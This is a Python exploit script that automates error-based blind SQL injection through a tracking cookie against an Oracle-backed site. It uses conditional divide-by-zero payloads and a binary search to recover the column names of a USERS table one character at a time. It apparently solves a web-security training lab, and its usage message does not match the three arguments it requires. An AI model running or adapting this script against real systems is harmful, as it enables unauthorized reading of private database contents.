import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url = sys.argv[1]

def request(sqli_payload):
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': 'QcpusvHka21TxYv1' + sqli_payload_encoded, 'session': 'qvOM6oWp9lPrHEBkUDE4IJKWbx31PF68'}
    r = requests.get(url, cookies=cookies, verify=False)
    return r

def columnName_len(i, j):
    for x in range(i,j):
        sqli_payload = "'||(SELECT CASE WHEN ((SELECT length(''||LISTAGG(column_name,',') within group (order by column_name)) as ab FROM all_tab_columns where table_name = 'USERS') = %s) THEN TO_CHAR(0/1) ELSE TO_CHAR(1/0) END FROM dual)||'" % (x)
        r = request(sqli_payload)
        if r.status_code == 200:
            print("\nlength is: ", x)
            return x
        else:
            sys.stdout.write('\r' + str(x))

def columnName(a,b):
    l = columnName_len(a, b)
    name = ""
    print("The columns contained in the table are: ")
    for i in range (1,l+1):
        c = 32
        d = 126
        while True:
            x = int((c+d)/2)
            sqli_payload = "'||(SELECT CASE WHEN((SELECT ascii(substr((''||LISTAGG(column_name,',') within group (order by column_name)),%s,1)) as ab FROM all_tab_columns where table_name = 'USERS') = '%s') THEN TO_CHAR(0/1) ELSE TO_CHAR(1/0) END FROM dual)||'" % (i,x) 
            r = request(sqli_payload)
            sp = "'||(SELECT CASE WHEN((SELECT ascii(substr((''||LISTAGG(column_name,',') within group (order by column_name)),%s,1)) as ab FROM all_tab_columns where table_name = 'USERS') > '%s') THEN TO_CHAR(0/1) ELSE TO_CHAR(1/0) END FROM dual)||'" % (i,x) 
            r1 = request(sp)
            if r.status_code == 200:
                name += chr(x)
                print(name)
                break
            else:
                sys.stdout.write('\r' + chr(x))  
            if r1.status_code == 200:
                c = x
            else:
                d = x

def main():
    if len(sys.argv) !=4:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    a = int(sys.argv[2])
    b = int(sys.argv[3])
    columnName(a,b)


if __name__ == "__main__":
    main()